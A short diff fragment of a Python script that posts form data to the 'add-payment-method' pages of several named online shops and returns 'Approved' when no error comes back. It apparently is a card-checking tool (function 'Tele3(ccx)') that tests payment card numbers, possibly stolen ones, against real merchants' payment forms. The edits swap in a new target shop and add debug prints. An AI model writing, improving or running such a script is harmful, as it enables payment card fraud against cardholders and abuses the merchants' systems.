-    'https://alphawolfnutrition.com/my-account/add-payment-method/',
-    cookies=cookies,
-    headers=headers,
-    data=data,
-  )
+  response = requests.post('https://www.yazoomills.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
   text=response.text
   html_text=response.text
   soup = BeautifulSoup(html_text, 'html.parser')
@@ -438,7 +463,8 @@ def Tele3(ccx):
     try:
         response = r.post('https://aptekaleki24.co.uk/', params=params, cookies=r.cookies, headers=headers, data=data)
         i = (response.json()['error']['message'])
+        print(i)
         return i
     except:
-        print(response.json())
+        print(response.json()['status'])
         return 'Approved'
